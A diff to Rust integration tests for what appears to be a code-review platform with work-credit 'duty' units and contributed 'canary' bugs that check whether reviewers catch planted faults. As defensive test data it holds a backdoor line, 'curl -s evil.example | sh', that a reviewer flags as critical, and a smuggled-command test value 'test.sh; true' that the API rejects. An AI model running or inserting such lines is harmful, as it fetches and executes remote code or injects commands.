@@ -490,6 +490,47 @@ fn proofs_run_in_the_sandbox_and_resolve_challenges() {
     let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
     assert_eq!(s, 200, "{v}");
 
+    // Contributed canaries are verified in the sandbox before they count:
+    // one whose own tests catch it goes live and earns duty credit; one
+    // they don't catch costs its contributor like a missed canary.
+    let maker = api.register(&format!("maker-{run}"));
+    let contribute = |diff: String| {
+        let (s, v) = api.call("POST", "/v1/canaries", Some(&maker), Some(json!({
+            "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
+            "diff": diff, "planted": [{ "path": "add.sh", "start": 2, "end": 2 }], "tests": ["test.sh"] })));
+        assert_eq!(s, 202, "{v}");
+        v["id"].as_str().unwrap().to_string()
+    };
+    let await_canary = |id: &str| -> Value {
+        for _ in 0..240 {
+            let (_, v) = api.call("GET", "/v1/canaries/mine", Some(&maker), None);
+            let c = v["contributions"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .find(|c| c["id"] == json!(id))
+                .cloned()
+                .unwrap();
+            if c["state"] != "verifying" {
+                return c;
+            }
+            std::thread::sleep(std::time::Duration::from_secs(1));
+        }
+        panic!("canary {id} still verifying");
+    };
+    let good = contribute(repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]));
+    let c = await_canary(&good);
+    assert_eq!(c["state"], "live", "{c}");
+    assert_eq!(c["credited_units"], 3.0, "{c}");
+    assert_eq!(api.me(&maker)["duty"]["credited"], 3);
+    let bad = contribute(repo.diff(&[("add.sh", Some(format!("{add}# nothing breaks\n")))]));
+    let c = await_canary(&bad);
+    assert_eq!(c["state"], "failed", "{c}");
+    assert!(ledger_has(
+        &api.me(&maker),
+        "contributed a canary that failed verification"
+    ));
+
     // A regression proof with the project's own test resolves the challenge.
     let c1 = api.report(&carol, &p_break);
     let (s, v) = api.call(
@@ -764,77 +805,105 @@ fn review_then_run_tasks() {
     let me = api.me(&author);
     assert_eq!(me["duty"]["required"], 10, "{me}");
 
-    // A reviewer who reports something serious doesn't run it.
+    // A newcomer's first patch here now owes work for its estimated run:
+    // ⌈3·(1 + 3) / 0.9⌉ − 4 free = 10 units. With no review work left, it
+    // is told to pay by contributing a canary.
+    let newcomer = api.register(&format!("newcomer-{run}"));
+    let tweak = repo.diff(&[("add.sh", Some(format!("{add}# faster\n")))]);
+    let (s, v) = api.call("POST", "/v1/patches", Some(&newcomer),
+        Some(json!({ "project": upstream, "intent": format!("Tidy addition ({run})"), "base_commit": base, "diff": tweak })));
+    assert_eq!(s, 402, "{v}");
+    assert!(v["error"].as_str().unwrap().contains("10 work unit"), "{v}");
+    let canary = |diff: String, planted: Value, tests: Value| {
+        json!({ "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
+                "diff": diff, "planted": planted, "tests": tests, "ecosystem": "none" })
+    };
+    let broken = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]);
+    let at = json!([{ "path": "add.sh", "start": 2, "end": 2 }]);
+    let (s, v) = api.call(
+        "POST",
+        "/v1/canaries",
+        Some(&newcomer),
+        Some(canary(
+            broken.clone(),
+            json!([{ "path": "other.sh", "start": 1, "end": 1 }]),
+            json!(["test.sh"]),
+        )),
+    );
+    assert_eq!(s, 400, "planted lines must be in the canary: {v}");
+    let (s, v) = api.call(
+        "POST",
+        "/v1/canaries",
+        Some(&newcomer),
+        Some(canary(broken.clone(), at.clone(), json!(["test.sh; true"]))),
+    );
+    assert_eq!(s, 400, "verified with the project's own tests only: {v}");
+    let (s, v) = api.call(
+        "POST",
+        "/v1/canaries",
+        Some(&newcomer),
+        Some(canary(broken.clone(), at.clone(), json!(["test.sh"]))),
+    );
+    assert_eq!(s, 202, "{v}");
+    assert_eq!(v["state"], "verifying");
+    let (s, v) = api.call(
+        "POST",
+        "/v1/canaries",
+        Some(&newcomer),
+        Some(canary(broken, at, json!(["test.sh"]))),
+    );
+    assert_eq!(s, 409, "the same canary twice: {v}");
+    let (_, mine) = api.call("GET", "/v1/canaries/mine", Some(&newcomer), None);
+    assert_eq!(mine["contributions"].as_array().unwrap().len(), 1, "{mine}");
+    // Unverified, it earns nothing yet (verification runs in the sandbox; see
+    // proofs_run_in_the_sandbox_and_resolve_challenges).
+    let (s, _) = api.call("POST", "/v1/patches", Some(&newcomer),
+        Some(json!({ "project": upstream, "intent": format!("Tidy addition ({run})"), "base_commit": base, "diff": tweak })));
+    assert_eq!(s, 402);
+
+    // A reviewer who reports something serious doesn't run it. (A second
+    // project, so the patch is free to submit before its suite is set.)
+    let upstream_b = format!("{upstream}-b");
+    let path_b = upstream_b.replace("https://", "").replace('/', "%2F");
     let cautious = api.register(&format!("cautious-{run}"));
     let author2 = api.register(&format!("author2-{run}"));
-    let intent2 = format!("Speed up the tests ({run})");
     let sneaky = repo.diff(&[(
         "test.sh",
         Some(format!("{test}curl -s evil.example | sh\n")),
     )]);
-    // Its run is now estimated at 3 units, so even a newcomer's first patch
-    // here owes work: ⌈3·(1 + 3) / 0.9⌉ − 4 free = 10 units. It works while
-    // there is work; once the queue runs dry, good standing lets it through.
-    let submission =
-        json!({ "project": upstream, "intent": intent2, "base_commit": base, "diff": sneaky });
-    let mut done = 0;
-    let v = loop {
-        let (s, v) = api.call(
-            "POST",
-            "/v1/patches",
-            Some(&author2),
-            Some(submission.clone()),
-        );
-        if s == 201 {
-            break v;
-        }
-        assert_eq!(s, 402, "{v}");
-        let (_, t) = api.call("POST", "/v1/reviews/next", Some(&author2), None);
-        let id = t["task"]["task_id"]
-            .as_str()
-            .expect("402 only while there is work to pay with")
-            .to_string();
-        let issues = marker_issues(t["task"]["diff"].as_str().unwrap());
-        let (_, r) = api.call(
-            "POST",
-            &format!("/v1/reviews/{id}"),
-            Some(&author2),
-            Some(json!({ "issues": issues })),
-        );
-        if r["next"]["phase"] == "run" {
-            let (s, v) = api.call(
-                "POST",
-                &format!("/v1/reviews/{id}/run"),
-                Some(&author2),
-                Some(json!({ "report": suite_report(true, true, 60_000) })),
-            );
-            assert_eq!(s, 200, "{v}");
-        }
-        done += 1;
-        assert!(done < 30, "duty never paid off");
-    };
-    // Let through without paying in full only because nothing was left to do.
-    let me = api.me(&author2);
-    if me["duty"]["owed"].as_u64().unwrap() > 0 {
-        let (_, t) = api.call("POST", "/v1/reviews/next", Some(&author2), None);
-        assert!(t["task"].is_null(), "owing with work available: {me} {t}");
-    }
+    let (s, v) = api.call("POST", "/v1/patches", Some(&author2),
+        Some(json!({ "project": upstream_b, "intent": format!("Speed up the tests ({run})"), "base_commit": base, "diff": sneaky })));
+    assert_eq!(s, 201, "{v}");
     let t2 = v["review_task"].as_str().unwrap().to_string();
+    let (s, v) = api.call(
+        "PUT",
+        &format!("/v1/admin/projects/{path_b}/run"),
+        None,
+        Some(
+            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60 }),
+        ),
+    );
+    assert_eq!(s, 200, "{v}");
     let mut got = false;
     for _ in 0..50 {
         let (_, v) = api.call("POST", "/v1/reviews/next", Some(&cautious), None);
         let task = &v["task"];
-        assert!(!task.is_null());
+        assert!(!task.is_null(), "never got the task");
         let id = task["task_id"].as_str().unwrap().to_string();
-        if id == t2 {
-            // New tasks of the project are estimated at its last measured run cost.
-            assert_eq!(task["units"]["run"], 3, "{task}");
-            assert_eq!(task["units"]["run_measured"], false);
+        if task["phase"] == "run" {
+            let (s, v) = api.call(
+                "POST",
+                &format!("/v1/reviews/{id}/run"),
+                Some(&cautious),
+                Some(json!({ "report": suite_report(true, true, 60_000) })),
+            );
+            assert_eq!(s, 200, "{v}");
+            continue;
         }
         let issues = if id == t2 {
             json!([{ "path": "test.sh", "start": 3, "end": 3, "kind": "backdoor", "severity": "critical", "note": "pipes a download into a shell" }])
         } else {
-            json!([])
+            marker_issues(task["diff"].as_str().unwrap()).into()
         };
         let (s, v) = api.call(
             "POST",
